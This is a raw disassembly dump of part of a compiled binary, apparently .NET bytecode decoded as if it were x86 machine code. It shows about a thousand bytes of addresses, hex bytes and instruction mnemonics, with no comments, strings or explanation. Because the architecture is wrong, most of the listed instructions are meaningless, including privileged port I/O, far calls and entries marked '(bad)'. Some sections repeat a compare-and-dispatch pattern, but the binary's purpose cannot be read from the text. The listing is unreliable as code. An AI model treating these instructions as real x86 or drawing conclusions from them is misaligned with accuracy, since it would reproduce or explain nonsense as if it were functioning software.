  404191:	00 00                	add    %al,(%eax)
  404193:	00 00                	add    %al,(%eax)
  404195:	00 00                	add    %al,(%eax)
  404197:	00 b4 07 00 00 b4 07 	add    %dh,0x7b40000(%edi,%eax,1)
  40419e:	00 00                	add    %al,(%eax)
  4041a0:	1b 00                	sbb    (%eax),%eax
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	29 00                	sub    %eax,(%eax)
  4041a6:	00 01                	add    %al,(%ecx)
  4041a8:	1b 30                	sbb    (%eax),%esi
  4041aa:	0a 00                	or     (%eax),%al
  4041ac:	b2 04                	mov    $0x4,%dl
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	24 00                	and    $0x0,%al
  4041b2:	00 11                	add    %dl,(%ecx)
  4041b4:	28 d3                	sub    %dl,%bl
  4041b6:	00 00                	add    %al,(%eax)
  4041b8:	0a 02                	or     (%edx),%al
  4041ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4041bb:	d4 00                	aam    $0x0
  4041bd:	00 0a                	add    %cl,(%edx)
  4041bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c0:	d5 00                	aad    $0x0
  4041c2:	00 0a                	add    %cl,(%edx)
  4041c4:	13 05 16 13 04 38    	adc    0x38041316,%eax
  4041ca:	67 04 00             	addr16 add $0x0,%al
  4041cd:	00 11                	add    %dl,(%ecx)
  4041cf:	05 11 04 9a 0a       	add    $0xa9a0411,%eax
  4041d4:	06                   	push   %es
  4041d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d6:	d6                   	salc
  4041d7:	00 00                	add    %al,(%eax)
  4041d9:	0a 72 17             	or     0x17(%edx),%dh
  4041dc:	0b 00                	or     (%eax),%eax
  4041de:	70 16                	jo     0x4041f6
  4041e0:	28 5b 00             	sub    %bl,0x0(%ebx)
  4041e3:	00 0a                	add    %cl,(%edx)
  4041e5:	16                   	push   %ss
  4041e6:	40                   	inc    %eax
  4041e7:	44                   	inc    %esp
  4041e8:	04 00                	add    $0x0,%al
  4041ea:	00 06                	add    %al,(%esi)
  4041ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ed:	d7                   	xlat   %ds:(%ebx)
  4041ee:	00 00                	add    %al,(%eax)
  4041f0:	0a 13                	or     (%ebx),%dl
  4041f2:	07                   	pop    %es
  4041f3:	16                   	push   %ss
  4041f4:	13 06                	adc    (%esi),%eax
  4041f6:	38 29                	cmp    %ch,(%ecx)
  4041f8:	04 00                	add    $0x0,%al
  4041fa:	00 11                	add    %dl,(%ecx)
  4041fc:	07                   	pop    %es
  4041fd:	11 06                	adc    %eax,(%esi)
  4041ff:	9a 0b 07 14 72 a1 07 	lcall  $0x7a1,$0x7214070b
  404206:	00 70 16             	add    %dh,0x16(%eax)
  404209:	8d 03                	lea    (%ebx),%eax
  40420b:	00 00                	add    %al,(%eax)
  40420d:	01 14 14             	add    %edx,(%esp,%edx,1)
  404210:	14 28                	adc    $0x28,%al
  404212:	41                   	inc    %ecx
  404213:	00 00                	add    %al,(%eax)
  404215:	0a 72 25             	or     0x25(%edx),%dh
  404218:	0b 00                	or     (%eax),%eax
  40421a:	70 16                	jo     0x404232
  40421c:	28 d8                	sub    %bl,%al
  40421e:	00 00                	add    %al,(%eax)
  404220:	0a 2c 65 07 14 72 2d 	or     0x2d721407(,%eiz,2),%ch
  404227:	0b 00                	or     (%eax),%eax
  404229:	70 18                	jo     0x404243
  40422b:	8d 03                	lea    (%ebx),%eax
  40422d:	00 00                	add    %al,(%eax)
  40422f:	01 13                	add    %edx,(%ebx)
  404231:	09 11                	or     %edx,(%ecx)
  404233:	09 16                	or     %edx,(%esi)
  404235:	14 a2                	adc    $0xa2,%al
  404237:	11 09                	adc    %ecx,(%ecx)
  404239:	17                   	pop    %ss
  40423a:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404240:	13 08                	adc    (%eax),%ecx
  404242:	11 08                	adc    %ecx,(%eax)
  404244:	16                   	push   %ss
  404245:	7e 07                	jle    0x40424e
  404247:	00 00                	add    %al,(%eax)
  404249:	04 a2                	add    $0xa2,%al
  40424b:	11 08                	adc    %ecx,(%eax)
  40424d:	17                   	pop    %ss
  40424e:	7e 08                	jle    0x404258
  404250:	00 00                	add    %al,(%eax)
  404252:	04 a2                	add    $0xa2,%al
  404254:	11 08                	adc    %ecx,(%eax)
  404256:	18 7e 0a             	sbb    %bh,0xa(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	04 a2                	add    $0xa2,%al
  40425d:	11 08                	adc    %ecx,(%eax)
  40425f:	19 7e 09             	sbb    %edi,0x9(%esi)
  404262:	00 00                	add    %al,(%eax)
  404264:	04 a2                	add    $0xa2,%al
  404266:	11 08                	adc    %ecx,(%eax)
  404268:	1a 28                	sbb    (%eax),%ch
  40426a:	6e                   	outsb  %ds:(%esi),(%dx)
  40426b:	00 00                	add    %al,(%eax)
  40426d:	06                   	push   %es
  40426e:	a2 11 08 a2 11       	mov    %al,0x11a20811
  404273:	09 14 14             	or     %edx,(%esp,%edx,1)
  404276:	14 17                	adc    $0x17,%al
  404278:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40427c:	0a 26                	or     (%esi),%ah
  40427e:	dd e2                	fucom  %st(2)
  404280:	03 00                	add    (%eax),%eax
  404282:	00 38                	add    %bh,(%eax)
  404284:	96                   	xchg   %eax,%esi
  404285:	03 00                	add    (%eax),%eax
  404287:	00 07                	add    %al,(%edi)
  404289:	14 72                	adc    $0x72,%al
  40428b:	a1 07 00 70 16       	mov    0x16700007,%eax
  404290:	8d 03                	lea    (%ebx),%eax
  404292:	00 00                	add    %al,(%eax)
  404294:	01 14 14             	add    %edx,(%esp,%edx,1)
  404297:	14 28                	adc    $0x28,%al
  404299:	41                   	inc    %ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 72 3b             	or     0x3b(%edx),%dh
  40429f:	0b 00                	or     (%eax),%eax
  4042a1:	70 16                	jo     0x4042b9
  4042a3:	28 d8                	sub    %bl,%al
  4042a5:	00 00                	add    %al,(%eax)
  4042a7:	0a 39                	or     (%ecx),%bh
  4042a9:	9d                   	popf
  4042aa:	00 00                	add    %al,(%eax)
  4042ac:	00 72 53             	add    %dh,0x53(%edx)
  4042af:	0b 00                	or     (%eax),%eax
  4042b1:	70 7e                	jo     0x404331
  4042b3:	0a 00                	or     (%eax),%al
  4042b5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4042b8:	1f                   	pop    %ds
  4042b9:	00 00                	add    %al,(%eax)
  4042bb:	0a 28                	or     (%eax),%ch
  4042bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4042be:	00 00                	add    %al,(%eax)
  4042c0:	06                   	push   %es
  4042c1:	28 1f                	sub    %bl,(%edi)
  4042c3:	00 00                	add    %al,(%eax)
  4042c5:	0a 7e 0a             	or     0xa(%esi),%bh
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	04 28                	add    $0x28,%al
  4042cc:	1f                   	pop    %ds
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	0a 7e 1d             	or     0x1d(%esi),%bh
  4042d2:	00 00                	add    %al,(%eax)
  4042d4:	04 18                	add    $0x18,%al
  4042d6:	9a 28 d9 00 00 0a 28 	lcall  $0x280a,$0xd928
  4042dd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4042de:	00 00                	add    %al,(%eax)
  4042e0:	0a 28                	or     (%eax),%ch
  4042e2:	1f                   	pop    %ds
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 7e 0a             	or     0xa(%esi),%bh
  4042e8:	00 00                	add    %al,(%eax)
  4042ea:	04 28                	add    $0x28,%al
  4042ec:	1f                   	pop    %ds
  4042ed:	00 00                	add    %al,(%eax)
  4042ef:	0a 07                	or     (%edi),%al
  4042f1:	14 72                	adc    $0x72,%al
  4042f3:	2d 0b 00 70 18       	sub    $0x1870000b,%eax
  4042f8:	8d 03                	lea    (%ebx),%eax
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	01 13                	add    %edx,(%ebx)
  4042fe:	08 11                	or     %dl,(%ecx)
  404300:	08 16                	or     %dl,(%esi)
  404302:	14 a2                	adc    $0xa2,%al
  404304:	11 08                	adc    %ecx,(%eax)
  404306:	17                   	pop    %ss
  404307:	17                   	pop    %ss
  404308:	8d 03                	lea    (%ebx),%eax
  40430a:	00 00                	add    %al,(%eax)
  40430c:	01 13                	add    %edx,(%ebx)
  40430e:	09 11                	or     %edx,(%ecx)
  404310:	09 16                	or     %edx,(%esi)
  404312:	7e 1d                	jle    0x404331
  404314:	00 00                	add    %al,(%eax)
  404316:	04 18                	add    $0x18,%al
  404318:	9a 28 d9 00 00 0a 8c 	lcall  $0x8c0a,$0xd928
  40431f:	7d 00                	jge    0x404321
  404321:	00 01                	add    %al,(%ecx)
  404323:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404328:	08 14 14             	or     %dl,(%esp,%edx,1)
  40432b:	14 28                	adc    $0x28,%al
  40432d:	41                   	inc    %ecx
  40432e:	00 00                	add    %al,(%eax)
  404330:	0a 28                	or     (%eax),%ch
  404332:	91                   	xchg   %eax,%ecx
  404333:	00 00                	add    %al,(%eax)
  404335:	0a 28                	or     (%eax),%ch
  404337:	23 00                	and    (%eax),%eax
  404339:	00 0a                	add    %cl,(%edx)
  40433b:	28 2f                	sub    %ch,(%edi)
  40433d:	00 00                	add    %al,(%eax)
  40433f:	06                   	push   %es
  404340:	dd 20                	frstor (%eax)
  404342:	03 00                	add    (%eax),%eax
  404344:	00 38                	add    %bh,(%eax)
  404346:	d4 02                	aam    $0x2
  404348:	00 00                	add    %al,(%eax)
  40434a:	07                   	pop    %es
  40434b:	14 72                	adc    $0x72,%al
  40434d:	a1 07 00 70 16       	mov    0x16700007,%eax
  404352:	8d 03                	lea    (%ebx),%eax
  404354:	00 00                	add    %al,(%eax)
  404356:	01 14 14             	add    %edx,(%esp,%edx,1)
  404359:	14 28                	adc    $0x28,%al
  40435b:	41                   	inc    %ecx
  40435c:	00 00                	add    %al,(%eax)
  40435e:	0a 72 65             	or     0x65(%edx),%dh
  404361:	0b 00                	or     (%eax),%eax
  404363:	70 16                	jo     0x40437b
  404365:	28 d8                	sub    %bl,%al
  404367:	00 00                	add    %al,(%eax)
  404369:	0a 2c 62             	or     (%edx,%eiz,2),%ch
  40436c:	07                   	pop    %es
  40436d:	14 72                	adc    $0x72,%al
  40436f:	2d 0b 00 70 18       	sub    $0x1870000b,%eax
  404374:	8d 03                	lea    (%ebx),%eax
  404376:	00 00                	add    %al,(%eax)
  404378:	01 13                	add    %edx,(%ebx)
  40437a:	08 11                	or     %dl,(%ecx)
  40437c:	08 16                	or     %dl,(%esi)
  40437e:	14 a2                	adc    $0xa2,%al
  404380:	11 08                	adc    %ecx,(%eax)
  404382:	17                   	pop    %ss
  404383:	17                   	pop    %ss
  404384:	8d 03                	lea    (%ebx),%eax
  404386:	00 00                	add    %al,(%eax)
  404388:	01 13                	add    %edx,(%ebx)
  40438a:	09 11                	or     %edx,(%ecx)
  40438c:	09 16                	or     %edx,(%esi)
  40438e:	7e 1d                	jle    0x4043ad
  404390:	00 00                	add    %al,(%eax)
  404392:	04 18                	add    $0x18,%al
  404394:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  40439b:	14 14                	adc    $0x14,%al
  40439d:	14 28                	adc    $0x28,%al
  40439f:	41                   	inc    %ecx
  4043a0:	00 00                	add    %al,(%eax)
  4043a2:	0a 28                	or     (%eax),%ch
  4043a4:	23 00                	and    (%eax),%eax
  4043a6:	00 0a                	add    %cl,(%edx)
  4043a8:	0c 08                	or     $0x8,%al
  4043aa:	72 b7                	jb     0x404363
  4043ac:	06                   	push   %es
  4043ad:	00 70 6f             	add    %dh,0x6f(%eax)
  4043b0:	da 00                	fiaddl (%eax)
  4043b2:	00 0a                	add    %cl,(%edx)
  4043b4:	2c 08                	sub    $0x8,%al
  4043b6:	08 28                	or     %ch,(%eax)
  4043b8:	3a 00                	cmp    (%eax),%al
  4043ba:	00 06                	add    %al,(%esi)
  4043bc:	2b 06                	sub    (%esi),%eax
  4043be:	08 28                	or     %ch,(%eax)
  4043c0:	39 00                	cmp    %eax,(%eax)
  4043c2:	00 06                	add    %al,(%esi)
  4043c4:	dd 9c 02 00 00 38 50 	fstpl  0x50380000(%edx,%eax,1)
  4043cb:	02 00                	add    (%eax),%al
  4043cd:	00 07                	add    %al,(%edi)
  4043cf:	14 72                	adc    $0x72,%al
  4043d1:	a1 07 00 70 16       	mov    0x16700007,%eax
  4043d6:	8d 03                	lea    (%ebx),%eax
  4043d8:	00 00                	add    %al,(%eax)
  4043da:	01 14 14             	add    %edx,(%esp,%edx,1)
  4043dd:	14 28                	adc    $0x28,%al
  4043df:	41                   	inc    %ecx
  4043e0:	00 00                	add    %al,(%eax)
  4043e2:	0a 72 7b             	or     0x7b(%edx),%dh
  4043e5:	0b 00                	or     (%eax),%eax
  4043e7:	70 16                	jo     0x4043ff
  4043e9:	28 d8                	sub    %bl,%al
  4043eb:	00 00                	add    %al,(%eax)
  4043ed:	0a 2c 66             	or     (%esi,%eiz,2),%ch
  4043f0:	7e 1d                	jle    0x40440f
  4043f2:	00 00                	add    %al,(%eax)
  4043f4:	04 18                	add    $0x18,%al
  4043f6:	9a 28 2e 00 00 0a 2c 	lcall  $0x2c0a,$0x2e28
  4043fd:	4e                   	dec    %esi
  4043fe:	07                   	pop    %es
  4043ff:	14 72                	adc    $0x72,%al
  404401:	2d 0b 00 70 18       	sub    $0x1870000b,%eax
  404406:	8d 03                	lea    (%ebx),%eax
  404408:	00 00                	add    %al,(%eax)
  40440a:	01 13                	add    %edx,(%ebx)
  40440c:	08 11                	or     %dl,(%ecx)
  40440e:	08 16                	or     %dl,(%esi)
  404410:	14 a2                	adc    $0xa2,%al
  404412:	11 08                	adc    %ecx,(%eax)
  404414:	17                   	pop    %ss
  404415:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%ebp)
  40441b:	13 09                	adc    (%ecx),%ecx
  40441d:	11 09                	adc    %ecx,(%ecx)
  40441f:	16                   	push   %ss
  404420:	7e 1d                	jle    0x40443f
  404422:	00 00                	add    %al,(%eax)
  404424:	04 18                	add    $0x18,%al
  404426:	9a a2 11 09 17 7e 1d 	lcall  $0x1d7e,$0x170911a2
  40442d:	00 00                	add    %al,(%eax)
  40442f:	04 19                	add    $0x19,%al
  404431:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  404438:	72 00                	jb     0x40443a
  40443a:	00 06                	add    %al,(%esi)
  40443c:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404441:	08 14 14             	or     %dl,(%esp,%edx,1)
  404444:	14 17                	adc    $0x17,%al
  404446:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40444a:	0a 26                	or     (%esi),%ah
  40444c:	dd 14 02             	fstl   (%edx,%eax,1)
  40444f:	00 00                	add    %al,(%eax)
  404451:	38 c8                	cmp    %cl,%al
  404453:	01 00                	add    %eax,(%eax)
  404455:	00 07                	add    %al,(%edi)
  404457:	14 72                	adc    $0x72,%al
  404459:	a1 07 00 70 16       	mov    0x16700007,%eax
  40445e:	8d 03                	lea    (%ebx),%eax
  404460:	00 00                	add    %al,(%eax)
  404462:	01 14 14             	add    %edx,(%esp,%edx,1)
  404465:	14 28                	adc    $0x28,%al
  404467:	41                   	inc    %ecx
  404468:	00 00                	add    %al,(%eax)
  40446a:	0a 72 89             	or     -0x77(%edx),%dh
  40446d:	0b 00                	or     (%eax),%eax
  40446f:	70 16                	jo     0x404487
  404471:	28 d8                	sub    %bl,%al
  404473:	00 00                	add    %al,(%eax)
  404475:	0a 2c 55 07 14 72 2d 	or     0x2d721407(,%edx,2),%ch
  40447c:	0b 00                	or     (%eax),%eax
  40447e:	70 18                	jo     0x404498
  404480:	8d 03                	lea    (%ebx),%eax
  404482:	00 00                	add    %al,(%eax)
  404484:	01 13                	add    %edx,(%ebx)
  404486:	08 11                	or     %dl,(%ecx)
  404488:	08 16                	or     %dl,(%esi)
  40448a:	14 a2                	adc    $0xa2,%al
  40448c:	11 08                	adc    %ecx,(%eax)
  40448e:	17                   	pop    %ss
  40448f:	17                   	pop    %ss
  404490:	8d 03                	lea    (%ebx),%eax
  404492:	00 00                	add    %al,(%eax)
  404494:	01 13                	add    %edx,(%ebx)
  404496:	09 11                	or     %edx,(%ecx)
  404498:	09 16                	or     %edx,(%esi)
  40449a:	7e 1d                	jle    0x4044b9
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 18                	add    $0x18,%al
  4044a0:	9a 28 d9 00 00 0a 8c 	lcall  $0x8c0a,$0xd928
  4044a7:	7d 00                	jge    0x4044a9
  4044a9:	00 01                	add    %al,(%ecx)
  4044ab:	a2 11 09 a2 11       	mov    %al,0x11a20911
  4044b0:	08 14 14             	or     %dl,(%esp,%edx,1)
  4044b3:	14 28                	adc    $0x28,%al
  4044b5:	41                   	inc    %ecx
  4044b6:	00 00                	add    %al,(%eax)
  4044b8:	0a 28                	or     (%eax),%ch
  4044ba:	23 00                	and    (%eax),%eax
  4044bc:	00 0a                	add    %cl,(%edx)
  4044be:	28 3a                	sub    %bh,(%edx)
  4044c0:	00 00                	add    %al,(%eax)
  4044c2:	06                   	push   %es
  4044c3:	dd 9d 01 00 00 38    	fstpl  0x38000001(%ebp)
  4044c9:	51                   	push   %ecx
  4044ca:	01 00                	add    %eax,(%eax)
  4044cc:	00 07                	add    %al,(%edi)
  4044ce:	14 72                	adc    $0x72,%al
  4044d0:	a1 07 00 70 16       	mov    0x16700007,%eax
  4044d5:	8d 03                	lea    (%ebx),%eax
  4044d7:	00 00                	add    %al,(%eax)
  4044d9:	01 14 14             	add    %edx,(%esp,%edx,1)
  4044dc:	14 28                	adc    $0x28,%al
  4044de:	41                   	inc    %ecx
  4044df:	00 00                	add    %al,(%eax)
  4044e1:	0a 72 99             	or     -0x67(%edx),%dh
  4044e4:	0b 00                	or     (%eax),%eax
  4044e6:	70 16                	jo     0x4044fe
  4044e8:	28 d8                	sub    %bl,%al
  4044ea:	00 00                	add    %al,(%eax)
  4044ec:	0a 39                	or     (%ecx),%bh
  4044ee:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4044ef:	00 00                	add    %al,(%eax)
  4044f1:	00 7e 1d             	add    %bh,0x1d(%esi)
  4044f4:	00 00                	add    %al,(%eax)
  4044f6:	04 18                	add    $0x18,%al
  4044f8:	9a 28 db 00 00 0a 39 	lcall  $0x390a,$0xdb28
  4044ff:	91                   	xchg   %eax,%ecx
  404500:	00 00                	add    %al,(%eax)
  404502:	00 7e 1e             	add    %bh,0x1e(%esi)
  404505:	00 00                	add    %al,(%eax)
  404507:	04 17                	add    $0x17,%al
  404509:	3b 81 00 00 00 17    	cmp    0x17000000(%ecx),%eax
  40450f:	80 1e 00             	sbbb   $0x0,(%esi)
  404512:	00 04 07             	add    %al,(%edi,%eax,1)
  404515:	14 72                	adc    $0x72,%al
  404517:	2d 0b 00 70 18       	sub    $0x1870000b,%eax
  40451c:	8d 03                	lea    (%ebx),%eax
  40451e:	00 00                	add    %al,(%eax)
  404520:	01 13                	add    %edx,(%ebx)
  404522:	08 11                	or     %dl,(%ecx)
  404524:	08 16                	or     %dl,(%esi)
  404526:	14 a2                	adc    $0xa2,%al
  404528:	11 08                	adc    %ecx,(%eax)
  40452a:	17                   	pop    %ss
  40452b:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404531:	13 09                	adc    (%ecx),%ecx
  404533:	11 09                	adc    %ecx,(%ecx)
  404535:	16                   	push   %ss
  404536:	28 6e 00             	sub    %ch,0x0(%esi)
  404539:	00 06                	add    %al,(%esi)
  40453b:	a2 11 09 17 7e       	mov    %al,0x7e170911
  404540:	1d 00 00 04 19       	sbb    $0x19040000,%eax
  404545:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  40454c:	72 00                	jb     0x40454e
  40454e:	00 06                	add    %al,(%esi)
  404550:	a2 11 09 18 7e       	mov    %al,0x7e180911
  404555:	1d 00 00 04 1a       	sbb    $0x1a040000,%eax
  40455a:	9a a2 11 09 19 7e 1d 	lcall  $0x1d7e,$0x190911a2
  404561:	00 00                	add    %al,(%eax)
  404563:	04 1b                	add    $0x1b,%al
  404565:	9a a2 11 09 1a 7e 1d 	lcall  $0x1d7e,$0x1a0911a2
  40456c:	00 00                	add    %al,(%eax)
  40456e:	04 1c                	add    $0x1c,%al
  404570:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  404577:	14 14                	adc    $0x14,%al
  404579:	14 28                	adc    $0x28,%al
  40457b:	41                   	inc    %ecx
  40457c:	00 00                	add    %al,(%eax)
  40457e:	0a 28                	or     (%eax),%ch
  404580:	23 00                	and    (%eax),%eax
  404582:	00 0a                	add    %cl,(%edx)
  404584:	28 39                	sub    %bh,(%ecx)
  404586:	00 00                	add    %al,(%eax)
  404588:	06                   	push   %es
  404589:	18 80 1e 00 00 04    	sbb    %al,0x400001e(%eax)
  40458f:	dd d1                	fst    %st(1)
  404591:	00 00                	add    %al,(%eax)
  404593:	00 38                	add    %bh,(%eax)
  404595:	85 00                	test   %eax,(%eax)
  404597:	00 00                	add    %al,(%eax)
  404599:	07                   	pop    %es
  40459a:	14 72                	adc    $0x72,%al
  40459c:	a1 07 00 70 16       	mov    0x16700007,%eax
  4045a1:	8d 03                	lea    (%ebx),%eax
  4045a3:	00 00                	add    %al,(%eax)
  4045a5:	01 14 14             	add    %edx,(%esp,%edx,1)
  4045a8:	14 28                	adc    $0x28,%al
  4045aa:	41                   	inc    %ecx
  4045ab:	00 00                	add    %al,(%eax)
  4045ad:	0a 72 a1             	or     -0x5f(%edx),%dh
  4045b0:	0b 00                	or     (%eax),%eax
  4045b2:	70 16                	jo     0x4045ca
  4045b4:	28 d8                	sub    %bl,%al
  4045b6:	00 00                	add    %al,(%eax)
  4045b8:	0a 2c 63             	or     (%ebx,%eiz,2),%ch
  4045bb:	7e 1d                	jle    0x4045da
  4045bd:	00 00                	add    %al,(%eax)
  4045bf:	04 18                	add    $0x18,%al
  4045c1:	9a 28 db 00 00 0a 2d 	lcall  $0x2d0a,$0xdb28
  4045c8:	55                   	push   %ebp
  4045c9:	7e 1e                	jle    0x4045e9
  4045cb:	00 00                	add    %al,(%eax)
  4045cd:	04 18                	add    $0x18,%al
  4045cf:	33 4b 17             	xor    0x17(%ebx),%ecx
  4045d2:	80 1e 00             	sbbb   $0x0,(%esi)
  4045d5:	00 04 07             	add    %al,(%edi,%eax,1)
  4045d8:	14 72                	adc    $0x72,%al
  4045da:	2d 0b 00 70 18       	sub    $0x1870000b,%eax
  4045df:	8d 03                	lea    (%ebx),%eax
  4045e1:	00 00                	add    %al,(%eax)
  4045e3:	01 13                	add    %edx,(%ebx)
  4045e5:	08 11                	or     %dl,(%ecx)
  4045e7:	08 16                	or     %dl,(%esi)
  4045e9:	14 a2                	adc    $0xa2,%al
  4045eb:	11 08                	adc    %ecx,(%eax)
  4045ed:	17                   	pop    %ss
  4045ee:	17                   	pop    %ss
  4045ef:	8d 03                	lea    (%ebx),%eax
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	01 13                	add    %edx,(%ebx)
  4045f5:	09 11                	or     %edx,(%ecx)
  4045f7:	09 16                	or     %edx,(%esi)
  4045f9:	28 6e 00             	sub    %ch,0x0(%esi)
  4045fc:	00 06                	add    %al,(%esi)
  4045fe:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404603:	08 14 14             	or     %dl,(%esp,%edx,1)
  404606:	14 28                	adc    $0x28,%al
  404608:	41                   	inc    %ecx
  404609:	00 00                	add    %al,(%eax)
  40460b:	0a 28                	or     (%eax),%ch
  40460d:	23 00                	and    (%eax),%eax
  40460f:	00 0a                	add    %cl,(%edx)
  404611:	28 39                	sub    %bh,(%ecx)
  404613:	00 00                	add    %al,(%eax)
  404615:	06                   	push   %es
  404616:	16                   	push   %ss
  404617:	80 1e 00             	sbbb   $0x0,(%esi)
  40461a:	00 04 de             	add    %al,(%esi,%ebx,8)
  40461d:	47                   	inc    %edi
  40461e:	11 06                	adc    %eax,(%esi)
  404620:	17                   	pop    %ss
  404621:	d6                   	salc
  404622:	13 06                	adc    (%esi),%eax
  404624:	11 06                	adc    %eax,(%esi)
  404626:	11 07                	adc    %eax,(%edi)
  404628:	8e b7 3f cc fb ff    	mov    -0x433c1(%edi),%?
  40462e:	ff 11                	call   *(%ecx)
  404630:	04 17                	add    $0x17,%al
  404632:	d6                   	salc
  404633:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404636:	04 11                	add    $0x11,%al
  404638:	05 8e b7 3f 8e       	add    $0x8e3fb78e,%eax
  40463d:	fb                   	sti
  40463e:	ff                   	(bad)
  40463f:	ff                   	lcall  (bad)
  404640:	de 23                	fisubs (%ebx)
  404642:	25 28 25 00 00       	and    $0x2528,%eax
  404647:	0a 0d 72 a9 0b 00    	or     0xba972,%cl
  40464d:	70 09                	jo     0x404658
  40464f:	6f                   	outsl  %ds:(%esi),(%dx)
  404650:	bf 00 00 0a 28       	mov    $0x280a0000,%edi
  404655:	1f                   	pop    %ds
  404656:	00 00                	add    %al,(%eax)
  404658:	0a 28                	or     (%eax),%ch
  40465a:	3a 00                	cmp    (%eax),%al
  40465c:	00 06                	add    %al,(%esi)
  40465e:	28 27                	sub    %ah,(%edi)
  404660:	00 00                	add    %al,(%eax)
  404662:	0a de                	or     %dh,%bl
  404664:	00 2a                	add    %ch,(%edx)
  404666:	00 00                	add    %al,(%eax)
  404668:	41                   	inc    %ecx
  404669:	1c 00                	sbb    $0x0,%al
	...
  404673:	00 8e 04 00 00 8e    	add    %cl,-0x71fffffc(%esi)
  404679:	04 00                	add    $0x0,%al
  40467b:	00 23                	add    %ah,(%ebx)
  40467d:	00 00                	add    %al,(%eax)
  40467f:	00 29                	add    %ch,(%ecx)
  404681:	00 00                	add    %al,(%eax)
  404683:	01 1b                	add    %ebx,(%ebx)
  404685:	30 03                	xor    %al,(%ebx)
  404687:	00 26                	add    %ah,(%esi)
  404689:	00 00                	add    %al,(%eax)
  40468b:	00 25 00 00 11 72    	add    %ah,0x72110000
  404691:	c7                   	(bad)
  404692:	0b 00                	or     (%eax),%eax
  404694:	70 7e                	jo     0x404714
  404696:	0a 00                	or     (%eax),%al
  404698:	00 04 02             	add    %al,(%edx,%eax,1)
  40469b:	28 28                	sub    %ch,(%eax)
  40469d:	00 00                	add    %al,(%eax)
  40469f:	0a 28                	or     (%eax),%ch
  4046a1:	2f                   	das
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	06                   	push   %es
  4046a5:	de 0e                	fimuls (%esi)
  4046a7:	25 28 25 00 00       	and    $0x2528,%eax
  4046ac:	0a 0a                	or     (%edx),%cl
  4046ae:	28 27                	sub    %ah,(%edi)
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	0a de                	or     %dh,%bl
  4046b4:	00 2a                	add    %ch,(%edx)
  4046b6:	00 00                	add    %al,(%eax)
  4046b8:	01 10                	add    %edx,(%eax)
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	00 00                	add    %al,(%eax)
  4046be:	00 00                	add    %al,(%eax)
  4046c0:	17                   	pop    %ss
  4046c1:	17                   	pop    %ss
  4046c2:	00 0e                	add    %cl,(%esi)
  4046c4:	29 00                	sub    %eax,(%eax)
  4046c6:	00 01                	add    %al,(%ecx)
  4046c8:	1b 30                	sbb    (%eax),%esi
  4046ca:	03 00                	add    (%eax),%eax
  4046cc:	26 00 00             	add    %al,%es:(%eax)
  4046cf:	00 26                	add    %ah,(%esi)
  4046d1:	00 00                	add    %al,(%eax)
  4046d3:	11 72 b7             	adc    %esi,-0x49(%edx)
  4046d6:	06                   	push   %es
  4046d7:	00 70 7e             	add    %dh,0x7e(%eax)
  4046da:	0a 00                	or     (%eax),%al
  4046dc:	00 04 02             	add    %al,(%edx,%eax,1)
  4046df:	28 28                	sub    %ch,(%eax)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	0a 28                	or     (%eax),%ch
  4046e5:	2f                   	das
  4046e6:	00 00                	add    %al,(%eax)
  4046e8:	06                   	push   %es
  4046e9:	de 0e                	fimuls (%esi)
  4046eb:	25 28 25 00 00       	and    $0x2528,%eax
  4046f0:	0a 0a                	or     (%edx),%cl
  4046f2:	28 27                	sub    %ah,(%edi)
  4046f4:	00 00                	add    %al,(%eax)
  4046f6:	0a de                	or     %dh,%bl
  4046f8:	00 2a                	add    %ch,(%edx)
  4046fa:	00 00                	add    %al,(%eax)
  4046fc:	01 10                	add    %edx,(%eax)
  4046fe:	00 00                	add    %al,(%eax)
  404700:	00 00                	add    %al,(%eax)
  404702:	00 00                	add    %al,(%eax)
  404704:	17                   	pop    %ss
  404705:	17                   	pop    %ss
  404706:	00 0e                	add    %cl,(%esi)
  404708:	29 00                	sub    %eax,(%eax)
  40470a:	00 01                	add    %al,(%ecx)
  40470c:	1b 30                	sbb    (%eax),%esi
  40470e:	05 00 d4 00 00       	add    $0xd400,%eax
  404713:	00 27                	add    %ah,(%edi)
  404715:	00 00                	add    %al,(%eax)
  404717:	11 73 80             	adc    %esi,-0x80(%ebx)
  40471a:	00 00                	add    %al,(%eax)
  40471c:	06                   	push   %es
  40471d:	0a 06                	or     (%esi),%al
  40471f:	02 17                	add    (%edi),%dl
  404721:	8d 49 00             	lea    0x0(%ecx),%ecx
  404724:	00 01                	add    %al,(%ecx)
  404726:	13 07                	adc    (%edi),%eax
  404728:	11 07                	adc    %eax,(%edi)
  40472a:	16                   	push   %ss
  40472b:	1f                   	pop    %ds
